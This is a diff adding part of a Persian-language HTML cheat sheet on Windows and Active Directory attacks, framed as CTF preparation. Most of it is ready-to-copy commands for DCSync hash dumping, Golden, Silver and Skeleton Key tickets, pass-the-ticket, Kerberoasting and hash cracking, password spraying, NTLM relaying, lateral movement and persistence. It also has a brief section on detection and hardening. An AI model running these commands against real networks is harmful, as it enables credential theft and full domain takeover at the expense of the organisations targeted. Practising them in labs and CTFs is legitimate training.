+                </div>
+                <pre><code class="language-bash"># ۱. DCSync Attack (دزدیدن هش‌ها از DC)
+# با mimikatz (روی ویندوز)
+mimikatz.exe "lsadump::dcsync /user:administrator /domain:domain.local" exit
+mimikatz.exe "lsadump::dcsync /user:krbtgt /domain:domain.local" exit
+
+# با impacket
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py domain.local/user:password@192.168.1.10
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py domain.local/user@192.168.1.10 -hashes LM:NTLM
+
+# با crackmapexec
+crackmapexec smb 192.168.1.10 -u user -p password --ntds
+crackmapexec smb 192.168.1.10 -u user -H NTLM --ntds
+
+# ۲. Golden Ticket Attack
+# با mimikatz
+mimikatz.exe "lsadump::lsa /patch" exit
+mimikatz.exe "kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:HASH /id:500 /ptt" exit
+
+# با impacket
+ticketer.py -domain-sid S-1-5-21-... -domain domain.local -krbtgt-hash HASH Administrator
+
+# ۳. Silver Ticket Attack
+mimikatz.exe "kerberos::golden /user:User /domain:domain.local /sid:S-1-5-21-... /target:DC.domain.local /service:cifs /rc4:HASH /ptt" exit
+# سرویس‌های مختلف: cifs, http, ldap, rpcss, dns, winrm, host
+
+# ۴. Skeleton Key Attack
+mimikatz.exe "privilege::debug" "misc::skeleton" exit
+# سپس با رمز "mimikatz" وارد شوید
+net use \\DC\share /user:Administrator mimikatz
+
+# ۵. Pass-the-Ticket (PTT)
+.\Rubeus.exe dump
+mimikatz.exe "sekurlsa::tickets /export" exit
+.\Rubeus.exe ptt /ticket:base64_encoded_ticket
+mimikatz.exe "kerberos::ptt /ticket:C:\path\to\ticket.kirbi" exit
+
+# ۶. Pass-the-Key (AES Key)
+mimikatz.exe "sekurlsa::ekeys" exit
+mimikatz.exe "kerberos::golden /domain:domain.local /sid:S-1-5-21-... /aes256:HASH /user:User /ptt" exit
+
+# ۷. JTR & Hashcat برای کرک Kerberos
+hashcat -m 13100 -a 0 kerberos.txt rockyou.txt
+hashcat -m 18200 -a 0 asrep.txt rockyou.txt
+hashcat -m 5600 -a 0 ntlmv2.txt rockyou.txt
+hashcat -m 1000 -a 0 ntlm.txt rockyou.txt</code></pre>
+            </div>
+        </section>
+
+        <!-- Phase 5 -->
+        <section id="phase5" class="tool-section">
+            <h2 class="tool-title">🛡️ فاز ۵: شناسایی و دفاع</h2>
+            
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">powershell</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-powershell"># Event Logs مهم
+# Event ID 4624  # Successful logon
+# Event ID 4625  # Failed logon
+# Event ID 4648  # Logon with explicit credentials
+# Event ID 4768  # Kerberos TGT request
+# Event ID 4769  # Kerberos service ticket request
+# Event ID 4776  # NTLM authentication
+# Event ID 4728  # Member added to security-enabled group
+# Event ID 4732  # Member added to security-enabled local group
+
+# با PowerShell
+Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4624}
+Get-WinEvent -LogName Security -MaxEvents 50 | Where-Object {$_.Id -eq 4768}
+
+# پیشنهادات امنیتی
+# غیرفعال کردن LLMNR/NBT-NS
+Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast" -Value 0
+
+# فعال کردن SMB Signing
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 1
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "EnableSecuritySignature" -Value 1</code></pre>
+            </div>
+        </section>
+
+        <!-- Checklist -->
+        <section id="checklist" class="tool-section">
+            <h2 class="tool-title">✅ چک‌لیست نهایی CTF ویندوز و AD</h2>
+            
+            <div class="checklist-box">
+                <h3 class="sub-title">فاز 1: Enumeration</h3>
+                <ul>
+                    <li><code>nmap -p 88,389,445,636,3268,3269 domain.local</code></li>
+                    <li><code>net view /domain</code></li>
+                    <li><code>nltest /dclist:DOMAIN</code></li>
+                    <li><code>net user /domain</code></li>
+                    <li><code>net group "Domain Admins" /domain</code></li>
+                    <li><code>enum4linux -a domain.local</code></li>
+                    <li><code>crackmapexec smb domain.local --users</code></li>
+                </ul>
+            </div>
+
+            <div class="checklist-box">
+                <h3 class="sub-title">فاز 2: Password Spraying</h3>
+                <ul>
+                    <li><code>kerbrute passwordspray users.txt 'Password123'</code></li>
+                    <li><code>crackmapexec smb domain.local -u users.txt -p 'Password123'</code></li>
+                    <li><code>crackmapexec ldap domain.local -u users.txt -p 'Password123'</code></li>
+                </ul>
+            </div>
+
+            <div class="checklist-box">
+                <h3 class="sub-title">فاز 3: Kerberos Attacks</h3>
+                <ul>
+                    <li><code>crackmapexec ldap domain.local --asreproast asrep.txt</code></li>
+                    <li><code>crackmapexec ldap domain.local --kerberoasting kerberoast.txt</code></li>
+                    <li><code>GetUserSPNs.py domain.local/user:password -request</code></li>
+                </ul>
+            </div>
+
+            <div class="checklist-box">
+                <h3 class="sub-title">فاز 4: NTLM Attacks</h3>
+                <ul>
+                    <li><code>responder -I eth0 -wrfv</code></li>
+                    <li><code>ntlmrelayx.py -tf targets.txt -smb2support</code></li>
+                    <li>کرک NTLMv2 با hashcat</li>
+                </ul>
+            </div>
+
+            <div class="checklist-box">
+                <h3 class="sub-title">فاز 5: BloodHound</h3>
+                <ul>
+                    <li><code>SharpHound.exe -c All</code></li>
+                    <li>Import در BloodHound</li>
+                    <li>پیدا کردن کوتاه‌ترین مسیر به Domain Admins</li>
+                </ul>
+            </div>
+
+            <div class="checklist-box">
+                <h3 class="sub-title">فاز 6: PrivEsc (ویندوز)</h3>
+                <ul>
+                    <li><code>whoami /priv</code></li>
+                    <li><code>sc query</code> (سرویس‌ها)</li>
+                    <li><code>schtasks /query</code> (Task Scheduler)</li>
+                    <li><code>reg query</code> (Registry)</li>
+                    <li><code>accesschk.exe -kwsvc</code> (خدمات قابل نوشتن)</li>
+                </ul>
+            </div>
+
+            <div class="checklist-box">
+                <h3 class="sub-title">فاز 7: Lateral Movement</h3>
+                <ul>
+                    <li><code>psexec.py domain.local/user@computer</code></li>
+                    <li><code>wmiexec.py domain.local/user@computer</code></li>
+                    <li><code>smbexec.py domain.local/user@computer</code></li>
+                    <li><code>atexec.py domain.local/user@computer</code></li>
+                </ul>
+            </div>
+
+            <div class="checklist-box">
+                <h3 class="sub-title">فاز 8: Persistence</h3>
+                <ul>
+                    <li>Golden Ticket</li>
+                    <li>Silver Ticket</li>
+                    <li>Skeleton Key</li>
+                    <li>Scheduled Tasks</li>
+                </ul>
+            </div>
+        </section>
+
+        <!-- Tips -->
+        <section id="tips" class="tool-section">
+            <h2 class="tool-title">💡 نکات طلایی پیشرفته برای CTF</h2>
+            
+            <div class="tip-box">
+                <ol>
+                    <li><strong>همیشه از BloodHound استفاده کنید:</strong> کوتاه‌ترین مسیر را پیدا می‌کند</li>
+                    <li><strong>ابزارهای ترکیبی:</strong> Responder + NTLMRelayx + CrackMapExec</li>
+                    <li><strong>SMB Shares معدن طلا هستند:</strong> همیشه <code>smbclient</code> را امتحان کنید</li>
+                    <li><strong>Kerberoasting همیشه جواب می‌دهد:</strong> سرویس اکانت‌ها معمولاً رمز ضعیف دارند</li>
+                    <li><strong>AS-REP Roasting:</strong> کاربران بدون Pre-Authentication را پیدا کنید</li>
+                    <li><strong>Password Spraying:</strong> روشی آرام اما مؤثر</li>
+                    <li><strong>DCSync:</strong> اگر به DC دسترسی دارید، همه هش‌ها را بگیرید</li>
+                    <li><strong>Mimikatz:</strong> قدرت اصلی در ویندوز (اما تشخیص داده می‌شود)</li>
+                    <li><strong>PowerShell در ویندوز:</strong> خیلی قدرتمند است، از آن استفاده کنید</li>
+                    <li><strong>همیشه log داشته باشید:</strong> برای گزارش نهایی</li>
+                </ol>
+            </div>
+        </section>
+
+        <!-- Scenarios -->
+        <section id="scenarios" class="tool-section">
+            <h2 class="tool-title">🏆 سناریوهای عملی CTF</h2>
+            
+            <h3 class="sub-title">سناریو ۱: Compromising a Domain Controller</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># 1. Initial foothold -&gt; کاربر معمولی
+# 2. Password Spraying -&gt; پیدا کردن کاربر
+crackmapexec smb domain.local -u users.txt -p 'Password123'
+
+# 3. Kerberoasting
+crackmapexec ldap domain.local -u user -p pass --kerberoasting
+hashcat -m 13100 hash.txt rockyou.txt
+
+# 4. با Credentials جدید
+psexec.py domain.local/admin@dc.domain.local
+
+# 5. DCSync
+secretsdump.py domain.local/admin@dc.domain.local</code></pre>
+            </div>
+
+            <h3 class="sub-title">سناریو ۲: NTLM Relay Attack</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># 1. پیدا کردن ماشین‌ها با SMB Signing Off
+crackmapexec smb domain.local -u user -p pass --smb-signing
+
+# 2. راه‌اندازی Responder
+responder -I eth0 -wrfv
+
+# 3. Relay کردن به target
+ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
+
+# 4. Shell گرفتن
+psexec.py domain.local/administrator@192.168.1.10 -hashes LM:NTLM</code></pre>
+            </div>
+
+            <h3 class="sub-title">سناریو ۳: BloodHound Path</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># 1. جمع‌آوری دیتا
+SharpHound.exe -c All
+
+# 2. Import در BloodHound
+# 3. پیدا کردن Path: User -&gt; Group -&gt; Computer -&gt; Domain Admin
+# 4. اجرای حمله
+psexec.py domain.local/user@computer</code></pre>
+            </div>
+        </section>
+
+        <!-- Tools Table -->
+        <section id="tools_tbl" class="tool-section">
+            <h2 class="tool-title">🛠️ ابزارهای ضروری (لیست کامل)</h2>
+            
+            <div class="table-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>ابزار</th>
+                            <th>کاربرد</th>
+                            <th>منبع</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr><td><strong>Mimikatz</strong></td><td>استخراج هش، تیکت، Golden Ticket</td><td>GitHub</td></tr>
+                        <tr><td><strong>Rubeus</strong></td><td>حملات Kerberos</td><td>GitHub</td></tr>
+                        <tr><td><strong>SharpHound</strong></td><td>جمع‌آوری BloodHound</td><td>GitHub</td></tr>
+                        <tr><td><strong>BloodHound</strong></td><td>تحلیل دامنه</td><td>GitHub</td></tr>
+                        <tr><td><strong>CrackMapExec</strong></td><td>Swiss Army Knife برای AD</td><td>GitHub</td></tr>
+                        <tr><td><strong>Responder</strong></td><td>LLMNR/NBT-NS Poisoning</td><td>GitHub</td></tr>
+                        <tr><td><strong>Impacket</strong></td><td>ابزارهای شبکه</td><td>GitHub</td></tr>
+                        <tr><td><strong>PowerSploit</strong></td><td>PowerShell ابزارها</td><td>GitHub</td></tr>
+                        <tr><td><strong>Nishang</strong></td><td>ابزارهای PowerShell</td><td>GitHub</td></tr>
+                        <tr><td><strong>Meterpreter</strong></td><td>پلتفرم Metasploit</td><td>GitHub</td></tr>
+                    </tbody>
+                </table>
+            </div>
+            <div class="goal-box" style="text-align: center; margin-top: 20px;">
+                <strong>"اکتیو دایرکتوری یک گنجینه است. اگر بدانید کجا نگاه کنید، همه چیز را پیدا خواهید کرد."</strong><br>
+                این چیت‌شیت تمام تکنیک‌های حملات به ویندوز و اکتیو دایرکتوری را پوشش می‌دهد.<br>
+                <strong>موفق باشید و هک لذت‌بخشی داشته باشید! 🔥💻🔐</strong>
+            </div>
+        </section>
+
+    </main>
+
+    <script>
+        // Initialize Highlight.js
+        document.addEventListener('DOMContentLoaded', (event) => {
+            document.querySelectorAll('pre code').forEach((block) => {
+                hljs.highlightBlock(block);
+            });
+        });
+
+        // Copy to Clipboard Function (Safely decodes HTML entities back to original code for copying)
+        function copyCode(btn) {
+            const codeBlock = btn.closest('.code-container').querySelector('code');
+            const textArea = document.createElement('textarea');
+            textArea.value = codeBlock.innerText; 
+            document.body.appendChild(textArea);
+            textArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
+
+            btn.innerText = '✓ کپی شد';
+            btn.style.background = '#58a6ff';
+            btn.style.color = '#000';
+            btn.style.borderColor = '#58a6ff';
+            
+            setTimeout(() => {
+                btn.innerText = 'کپی';
+                btn.style.background = '';
+                btn.style.color = '';
+                btn.style.borderColor = '';
+            }, 2000);
+        }
+
+        // Live Search Filter
+        function filterTools() {
+            const input = document.getElementById('searchInput').value.toLowerCase();
+            const listItems = document.querySelectorAll('.nav-list li');
+            
+            listItems.forEach(item => {
+                const text = item.textContent.toLowerCase();
+                if (text.includes(input)) {
+                    item.style.display = '';
+                } else {
+                    item.style.display = 'none';
+                }
+            });
+        }
+
+        // ScrollSpy Implementation
+        const sections = document.querySelectorAll('.tool-section');
+        const navLinks = document.querySelectorAll('.nav-list a');
+
+        window.addEventListener('scroll', () => {
+            let current = '';
+            sections.forEach(section => {
+                const sectionTop = section.offsetTop;
+                if (pageYOffset >= sectionTop - 50) {
+                    current = section.getAttribute('id');
+                }
+            });
+
+            navLinks.forEach(a => {
+                a.classList.remove('active');
+                if (a.getAttribute('href') === '#' + current) {
+                    a.classList.add('active');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
